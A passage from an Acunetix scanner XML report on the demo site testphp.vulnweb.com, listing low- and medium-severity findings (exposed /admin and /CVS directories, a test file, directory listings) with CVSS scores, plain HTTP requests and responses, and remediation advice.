          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[]]></AV>
          <AVdesc><![CDATA[]]></AVdesc>
          <AC><![CDATA[]]></AC>
          <ACdesc><![CDATA[]]></ACdesc>
          <PR><![CDATA[]]></PR>
          <PRdesc><![CDATA[]]></PRdesc>
          <UI><![CDATA[]]></UI>
          <UIdesc><![CDATA[]]></UIdesc>
          <S><![CDATA[]]></S>
          <Sdesc><![CDATA[]]></Sdesc>
          <C><![CDATA[]]></C>
          <Cdesc><![CDATA[]]></Cdesc>
          <I><![CDATA[]]></I>
          <Idesc><![CDATA[]]></Idesc>
          <A><![CDATA[]]></A>
          <Adesc><![CDATA[]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Apache Tips & Tricks: Deny access to some folders]]></Database>
          <URL><![CDATA[http://www.ducea.com/2006/08/11/apache-tips-tricks-deny-access-to-some-folders/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="85" color="blue">
       <Name><![CDATA[Possible sensitive directories]]></Name>
       <ModuleName><![CDATA[Scripting (Possible_Sensitive_Directories.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[/admin]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[This directory may expose sensitive information that could help a malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[A possible sensitive directory has been found. This directory is not directly linked from the website.This check looks for common sensitive resources like backup directories, database dumps, administration pages, temporary directories. Each one of these directories could help an attacker to learn more about his target.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Restrict access to this directory or remove it from the website.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /admin HTTP/1.1
Accept: acunetix/wvs
Range: bytes=0-99999
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm

]]></Request>
        <Response><![CDATA[HTTP/1.1 301 Moved Permanently
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:05:20 GMT
Content-Type: text/html
Content-Length: 184
Location: http://testphp.vulnweb.com/admin/
Connection: keep-alive
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Web Server Security and Database Server Security]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/webserver-security/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="86" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /Flash/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/Flash]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /Flash/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/Flash/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:58 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 387
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="87" color="blue">
       <Name><![CDATA[Possible sensitive files]]></Name>
       <ModuleName><![CDATA[Scripting (Possible_Sensitive_Files.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[/hpp/test.php]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[This file may expose sensitive information that could help a malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[A possible sensitive file has been found. This file is not directly linked from the website. This check looks for common sensitive resources like password files, configuration files, log files, include files, statistics data, database dumps. Each one of these files could help an attacker to learn more about his target.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Restrict access to this file or remove it from the website.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /hpp/test.php HTTP/1.1
Accept: acunetix/wvs
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm

]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:05:40 GMT
Content-Type: text/html
Connection: keep-alive
X-Powered-By: PHP/5.3.10-1~lucid+2uwsgi2
Original-Content-Encoding: gzip
Content-Length: 33
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Web Server Security and Database Server Security]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/webserver-security/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="88" color="blue">
       <Name><![CDATA[Possible sensitive directories]]></Name>
       <ModuleName><![CDATA[Scripting (Possible_Sensitive_Directories.script)]]></ModuleName>
       <Details><![CDATA[No details are available.]]></Details>
       <Affects><![CDATA[/CVS]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[low]]></Severity>
       <Type><![CDATA[Validation]]></Type>
       <Impact><![CDATA[This directory may expose sensitive information that could help a malicious user to prepare more advanced attacks.]]></Impact>
       <Description><![CDATA[A possible sensitive directory has been found. This directory is not directly linked from the website.This check looks for common sensitive resources like backup directories, database dumps, administration pages, temporary directories. Each one of these directories could help an attacker to learn more about his target.]]></Description>
       <DetailedInformation><![CDATA[]]></DetailedInformation>
       <Recommendation><![CDATA[Restrict access to this directory or remove it from the website.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /CVS HTTP/1.1
Accept: acunetix/wvs
Range: bytes=0-99999
Cookie: mycookie=3; login=test%2Ftest
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm

]]></Request>
        <Response><![CDATA[HTTP/1.1 301 Moved Permanently
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 01:05:43 GMT
Content-Type: text/html
Content-Length: 184
Location: http://testphp.vulnweb.com/CVS/
Connection: keep-alive
]]></Response>
       </TechnicalDetails>
       <CWE id="200"><![CDATA[CWE-200]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Web Server Security and Database Server Security]]></Database>
          <URL><![CDATA[http://www.acunetix.com/websitesecurity/webserver-security/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="89" color="orange">
       <Name><![CDATA[Directory listing]]></Name>
       <ModuleName><![CDATA[Scripting (Directory_Listing.script)]]></ModuleName>
       <Details><![CDATA[<br/>Pattern found: <pre wrap="virtual"><font color="blue">&lt;title&gt;Index of /images/&lt;/title&gt;</font></pre>]]></Details>
       <Affects><![CDATA[/images]]></Affects>
       <Parameter><![CDATA[]]></Parameter>
       <AOP_SourceFile><![CDATA[]]></AOP_SourceFile>
       <AOP_SourceLine>0</AOP_SourceLine>
       <AOP_Additional><![CDATA[]]></AOP_Additional>
       <IsFalsePositive><![CDATA[False]]></IsFalsePositive>
       <Severity><![CDATA[medium]]></Severity>
       <Type><![CDATA[Information]]></Type>
       <Impact><![CDATA[A user can view a list of all files from this directory possibly exposing sensitive information.]]></Impact>
       <Description><![CDATA[The web server is configured to display the list of files contained in this directory. This is not recommended because the directory may contain files that are not normally exposed through links on the web site.]]></Description>
       <DetailedInformation><![CDATA[<h2>How to disable directory listings</h2> <ul> <li>The easiest way to disable directory listing is to create an index file. The name of the index file depends on the web server configuration. On Apache is called index.htm, index.html. On IIS is named default.asp, default.aspx, default.htm.</li> <li>On IIS directory listings are disabled by default.</li> <li>For Apache you need to edit the Apache configuration file (usually named httpd.conf) or create an .htaccess file. In the configuration file you will have the definition of the directory. Something like   <pre wrap="virtual"><code>&lt;Directory  /directoryname/subdirectory&gt; Options Indexes FollowSymLinks ... &lt;/Directory&gt;</code></pre> To disable directory listing for that directory you need to remove the 'Indexes' option. </li> </ul>]]></DetailedInformation>
       <Recommendation><![CDATA[You should make sure the directory does not contain sensitive information or you may want to restrict directory listings from the web server configuration.]]></Recommendation>
       <TechnicalDetails>
        <Request><![CDATA[GET /images/ HTTP/1.1
Pragma: no-cache
Cache-Control: no-cache
Referer: http://testphp.vulnweb.com/images/
Host: testphp.vulnweb.com
Connection: Keep-alive
Accept-Encoding: gzip,deflate
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
Acunetix-Product: WVS/10.0 (Acunetix Web Vulnerability Scanner - NORMAL)
Acunetix-Scanning-agreement: Third Party Scanning PROHIBITED
Acunetix-User-agreement: http://www.acunetix.com/wvs/disc.htm
Accept: */*
]]></Request>
        <Response><![CDATA[HTTP/1.1 200 OK
Server: nginx/1.4.1
Date: Thu, 14 Jul 2016 00:49:58 GMT
Content-Type: text/html
Connection: keep-alive
Original-Content-Encoding: gzip
Content-Length: 393
]]></Response>
       </TechnicalDetails>
       <CWE id="538"><![CDATA[CWE-538]]></CWE>
      <CVEList></CVEList>
       <CVSS>
          <Descriptor><![CDATA[AV:N/AC:L/Au:N/C:P/I:N/A:N]]></Descriptor>
          <Score><![CDATA[5.0]]></Score>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable software is bound to the network stack and the attacker does not require local network access or local access.]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist.]]></ACdesc>
          <Au><![CDATA[None]]></Au>
          <Audesc><![CDATA[Authentication is not required to exploit the vulnerability.]]></Audesc>
          <C><![CDATA[Partial]]></C>
          <Cdesc><![CDATA[There is considerable informational disclosure. Access to some system files is possible, but the attacker does not have control over what is obtained, or the scope of the loss is constrained.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no impact to the integrity of the system.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to the availability of the system.]]></Adesc>
          <E><![CDATA[]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS>
       <CVSS3>
          <Descriptor><![CDATA[CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N]]></Descriptor>
          <Score><![CDATA[7.5]]></Score>
          <TempScore><![CDATA[]]></TempScore>
          <EnvScore><![CDATA[]]></EnvScore>
          <AV><![CDATA[Network]]></AV>
          <AVdesc><![CDATA[A vulnerability exploitable with network access means the vulnerable component is bound to the network stack and the attacker's path is through OSI layer 3 (the network layer). Such a vulnerability is often termed "remotely exploitable" and can be thought of as an attack being exploitable one or more network hops away (e.g. across layer 3 boundaries from routers).]]></AVdesc>
          <AC><![CDATA[Low]]></AC>
          <ACdesc><![CDATA[Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success against the vulnerable component.]]></ACdesc>
          <PR><![CDATA[None]]></PR>
          <PRdesc><![CDATA[The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files to carry out an attack.]]></PRdesc>
          <UI><![CDATA[None]]></UI>
          <UIdesc><![CDATA[The vulnerable system can be exploited without interaction from any user.]]></UIdesc>
          <S><![CDATA[Unchanged]]></S>
          <Sdesc><![CDATA[An exploited vulnerability can only affect resources managed by the same authority. In this case the vulnerable component and the impacted component are the same.]]></Sdesc>
          <C><![CDATA[High]]></C>
          <Cdesc><![CDATA[There is total loss of confidentiality, resulting in all resources within the impacted component being divulged to the attacker. Alternatively, access to only some restricted information is obtained, but the disclosed information presents a direct, serious impact.]]></Cdesc>
          <I><![CDATA[None]]></I>
          <Idesc><![CDATA[There is no loss of integrity within the impacted component.]]></Idesc>
          <A><![CDATA[None]]></A>
          <Adesc><![CDATA[There is no impact to availability within the impacted component.]]></Adesc>
          <E><![CDATA[X]]></E>
          <Edesc><![CDATA[]]></Edesc>
          <RL><![CDATA[X]]></RL>
          <RLdesc><![CDATA[]]></RLdesc>
          <RC><![CDATA[X]]></RC>
          <RCdesc><![CDATA[]]></RCdesc>
       </CVSS3>
       <References>
        <Reference>
          <Database><![CDATA[Directory Listing and Information Disclosure]]></Database>
          <URL><![CDATA[http://www.acunetix.com/blog/web-security-zone/directory-listing-information-disclosure/]]></URL>
        </Reference>
       </References>
      </ReportItem>

      <ReportItem id="90" color="blue">
